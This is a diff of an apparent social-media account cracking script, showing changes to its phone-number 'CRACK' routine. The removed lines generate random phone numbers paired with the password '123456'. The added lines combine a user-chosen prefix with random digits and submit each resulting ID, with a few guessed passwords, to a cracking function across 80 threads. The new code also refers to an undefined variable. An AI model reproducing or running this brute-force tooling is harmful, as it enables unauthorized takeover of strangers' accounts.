@@ -287,23 +287,27 @@ def Email():
 	setting()
 #========= CRACK NOMOR ========#					
 def Nomor():
-	clear()
-	logo()
-	depan = input(f'{P}[{H}?{P}] Enter Number(Example > 017 019 018) : ')
-	if len(depan)==3:pass
-	else:exit(f'{P}[{H}?{P}] contoh awalan nomor 089')
-	jumla = input(f'{P}[{H}?{P}] Put Limit : ')
-	for x in range(int(jumla)):
-		rr = random.randint
-		A1 = depan
-		B1 = rr(1111,9999)
-		C1 = rr(1,9)
-		D1 = f'{A1}{C1}-{str(rr(1111,9999))}-{str(B1)}'
-		if D1 in id:pass
-		else:id.append(D1+'|123456')
-		print(f'\r{P}[{H}?{P}]  berhasil mengumpulkan %s nomor '%(len(id)),end='')
-		sys.stdout.flush()
-	setting()	
+    os.system('clear')
+    print(logo)
+    code = input(f"{Y}[{W}~{Y}] {G}ENTER 4 DIGUT CODE {W}: ")
+    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
+    #code = random.choice([code1,code2,code3])
+    limit = input(f'{Y}[{W}~{Y}] {G}ENTER TOTAL LIMID {W}: ')
+    for a in range(int(limit)):
+        awm = "".join(random.choice(string.digits) for _ in range(6))
+        gen.append(awm)
+    with ThreadPoolExecutor(max_workers=80) as Submits:
+        os.system('clear')
+        print("\x1b[1;97m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥") 
+        for next in gen:
+            idf = code + next
+            mk = ids[:6]
+            xx = ids[:7]
+            v = ids[:8]
+            b = next[:6]  
+            pwv = [mk,xx,'57273200',v,'57575751','57575752']
+            Submits.submit(crackasync,idf,pwv)
 #========= CRACK FILE ========#			
 def File():
 	clear()
